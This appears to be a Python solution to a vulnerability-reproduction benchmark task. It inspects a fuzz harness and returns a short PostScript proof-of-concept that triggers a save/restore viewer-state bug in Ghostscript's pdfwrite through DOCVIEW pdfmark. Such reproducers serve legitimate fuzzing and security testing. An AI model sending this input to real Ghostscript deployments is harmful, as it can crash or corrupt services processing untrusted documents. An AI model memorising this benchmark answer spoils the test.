import os
import tarfile
from typing import Optional


class Solution:
    def _detect_harness_prefers_pdf(self, src_path: str) -> Optional[bool]:
        try:
            if os.path.isdir(src_path):
                for root, _, files in os.walk(src_path):
                    for fn in files:
                        if not fn.endswith((".c", ".cc", ".cpp", ".h", ".hh", ".hpp")):
                            continue
                        p = os.path.join(root, fn)
                        try:
                            with open(p, "rb") as f:
                                data = f.read(300_000)
                        except OSError:
                            continue
                        if b"LLVMFuzzerTestOneInput" in data or b"FuzzerTestOneInput" in data:
                            if b".pdf" in data and b".ps" not in data and b"run_string" not in data:
                                return True
                            if b".ps" in data or b"run_string" in data or b"gsapi_run_string" in data:
                                return False
                return None

            if not os.path.exists(src_path):
                return None

            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    n = m.name.lower()
                    if not (n.endswith(".c") or n.endswith(".cc") or n.endswith(".cpp") or n.endswith(".h")):
                        continue
                    if m.size <= 0:
                        continue
                    if m.size > 2_000_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read(300_000)
                    except Exception:
                        continue
                    if b"LLVMFuzzerTestOneInput" in data or b"FuzzerTestOneInput" in data:
                        if b".pdf" in data and b".ps" not in data and b"run_string" not in data:
                            return True
                        if b".ps" in data or b"run_string" in data or b"gsapi_run_string" in data:
                            return False
                return None
        except Exception:
            return None

    def solve(self, src_path: str) -> bytes:
        # Primary PoC: PostScript that performs save before DOCVIEW initializes viewer state,
        # then restore triggers viewer-state restore at depth 0 in vulnerable pdfwrite.
        ps_poc = (
            b"%!PS\n"
            b"save\n"
            b"[ /PageMode /UseOutlines /DOCVIEW pdfmark\n"
            b"restore\n"
            b"save\n"
            b"[ /PageLayout /OneColumn /DOCVIEW pdfmark\n"
            b"restore\n"
            b"showpage\n"
        )

        prefers_pdf = self._detect_harness_prefers_pdf(src_path)
        if prefers_pdf is True:
            # Still return PS; Ghostscript PDL selection generally honors %!PS header over extension.
            return ps_poc
        return ps_poc